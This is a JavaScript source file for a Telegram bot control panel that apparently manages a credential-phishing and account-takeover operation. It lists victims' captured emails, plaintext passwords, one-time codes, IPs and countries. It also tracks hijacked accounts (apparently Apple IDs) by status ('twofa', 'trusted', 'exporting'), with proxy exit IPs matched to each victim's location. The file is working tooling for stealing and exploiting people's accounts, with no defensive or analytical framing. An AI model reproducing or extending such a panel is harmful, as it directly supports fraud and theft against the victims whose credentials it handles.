import { InlineKeyboard } from "grammy";

/* Message + keyboard builders for the Telegram bot.  Keeping text and layout
 * here leaves bot.js to do nothing but route updates. */

export const PAGE_SIZE = 5;

export function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

export function menuView() {
  const keyboard = new InlineKeyboard()
    .text("📥 Submissions", "list:1")
    .text("📊 Stats", "stats")
    .row()
    .text("🔄 Refresh", "menu")
    .text("✖ Close", "close");
  return {
    text: [
      "<b>Control panel</b>",
      "",
      "Browse submissions, open one, change its status, or push a notice",
      "to every public visitor.",
    ].join("\n"),
    keyboard,
  };
}

export function listView(pageData) {
  const keyboard = new InlineKeyboard();
  for (const item of pageData.items) {
    const label = `${item.status === "new" ? "🟢" : item.status === "reviewed" ? "🟡" : "⚪"} ${item.email || "(no email)"}`;
    keyboard.text(label.slice(0, 60), `item:${item.id}`).row();
  }

  if (pageData.pages > 1) {
    if (pageData.page > 1) keyboard.text("‹ Prev", `list:${pageData.page - 1}`);
    keyboard.text(`${pageData.page} / ${pageData.pages}`, "noop");
    if (pageData.page < pageData.pages) {
      keyboard.text("Next ›", `list:${pageData.page + 1}`);
    }
    keyboard.row();
  }
  keyboard.text("🏠 Menu", "menu").text("🔄 Refresh", `list:${pageData.page}`);

  const lines = pageData.items.map(
    (item, index) =>
      `${(pageData.page - 1) * pageData.pageSize + index + 1}. ` +
      `<b>${escapeHtml(item.email || "(no email)")}</b> — ` +
      `${escapeHtml(item.status)} · ${escapeHtml(item.country || "?")}`
  );

  return {
    text: [
      `<b>Submissions</b> (${pageData.total})`,
      "",
      ...(lines.length ? lines : ["Nothing here yet."]),
    ].join("\n"),
    keyboard,
  };
}

export function itemView(item) {
  const keyboard = new InlineKeyboard()
    .text("✅ Reviewed", `set:${item.id}:reviewed`)
    .text("🏁 Done", `set:${item.id}:done`)
    .row()
    .text("🟢 New", `set:${item.id}:new`)
    .text("🗑 Delete", `delask:${item.id}`)
    .row()
    .text("‹ Back", "list:1")
    .text("🏠 Menu", "menu");

  const when = new Date(item.createdAt).toLocaleString("en-GB", {
    dateStyle: "short",
    timeStyle: "short",
  });

  return {
    text: [
      `<b>${escapeHtml(item.email || "(no email)")}</b>`,
      "",
      `Password: <code>${escapeHtml(item.password || "—")}</code>`,
      `Code: <code>${escapeHtml(item.code || "—")}</code>`,
      `Page: ${escapeHtml(item.page)}`,
      `IP: ${escapeHtml(item.ip || "—")}`,
      `Country: ${escapeHtml(item.country || "—")}`,
      `Status: <b>${escapeHtml(item.status)}</b>`,
      `Created: ${escapeHtml(when)}`,
      `Note: ${escapeHtml(item.note || "—")}`,
    ].join("\n"),
    keyboard,
  };
}

export function statsView(stats) {
  const keyboard = new InlineKeyboard()
    .text("📥 Submissions", "list:1")
    .text("🔄 Refresh", "stats")
    .row()
    .text("🏠 Menu", "menu");

  return {
    text: [
      "<b>Stats</b>",
      "",
      `Total: ${stats.total}`,
      `New: ${stats.byStatus.new ?? 0}`,
      `Reviewed: ${stats.byStatus.reviewed ?? 0}`,
      `Done: ${stats.byStatus.done ?? 0}`,
    ].join("\n"),
    keyboard,
  };
}

export function confirmDeleteView(item) {
  const keyboard = new InlineKeyboard()
    .text("Yes, delete", `del:${item.id}`)
    .text("Cancel", `item:${item.id}`);
  return {
    text: `<b>Delete</b> ${escapeHtml(item.email || item.id)}?\nThis cannot be undone.`,
    keyboard,
  };
}

/* ------------------------------------------------------------------ accounts */

export function formatBytes(value) {
  const bytes = Number(value) || 0;
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 ** 2) return `${(bytes / 1024).toFixed(1)} KB`;
  if (bytes < 1024 ** 3) return `${(bytes / 1024 ** 2).toFixed(1)} MB`;
  return `${(bytes / 1024 ** 3).toFixed(2)} GB`;
}

export function statusLight(account) {
  if (!account) return "🟡";
  if (["dead", "twofa", "invalid", "error"].includes(account.status)) return "🔴";
  if (
    ["connected", "done"].includes(account.status) &&
    account.trusted &&
    account.lastPingAt
  ) {
    return "🟢";
  }
  return "🟡";
}

export function accountCard(account, { title = "", extra = "" } = {}) {
  const identity = account.identity || {};
  const geo = account.geo || {};
  const proxy = account.proxy || {};
  return [
    `${statusLight(account)} <b>${escapeHtml(title || account.email)}</b>`,
    `Email: ${escapeHtml(account.email)}`,
    identity.name ? `Name: ${escapeHtml(identity.name)}` : "",
    account.locked
      ? `Status: <b>locked</b>${account.lockCode ? ` (${escapeHtml(account.lockCode)})` : ""}`
      : `Status: <b>${escapeHtml(account.status)}</b>${account.trusted ? " · trusted" : ""}`,
    account.locked ? "Unlock: https://iforgot.apple.com" : "",
    `Visitor: ${escapeHtml(geo.country || "—")} (${escapeHtml(geo.ip || "—")})`,
    `Proxy: ${escapeHtml(proxy.country || "—")} · exit ${escapeHtml(proxy.exitIp || "—")}`,
    extra ? escapeHtml(extra) : "",
    account.lastError ? `Error: ${escapeHtml(account.lastError)}` : "",
  ]
    .filter(Boolean)
    .join("\n");
}

export function accountStatsView(accounts, jobs, workers) {
  const keyboard = new InlineKeyboard()
    .text("🔄 Refresh", "S")
    .text("🏠 Menu", "m:1");
  const by = accounts.byStatus || {};
  return {
    text: [
      "<b>Stats</b>",
      "",
      `Accounts: ${accounts.total}`,
      `Connected: ${by.connected ?? 0} · 2FA: ${by.twofa ?? 0}`,
      `Queued: ${by.queued ?? 0} · Exporting: ${by.exporting ?? 0}`,
      `Invalid: ${by.invalid ?? 0} · Error: ${by.error ?? 0} · Dead: ${by.dead ?? 0}`,
      `Trusted: ${accounts.trusted ?? 0}`,
      "",
      `Jobs: ${jobs.total}`,
      `Workers: ${workers.workers} · auth slots ${workers.auth} · export ${workers.export}`,
    ].join("\n"),
    keyboard,
  };
}
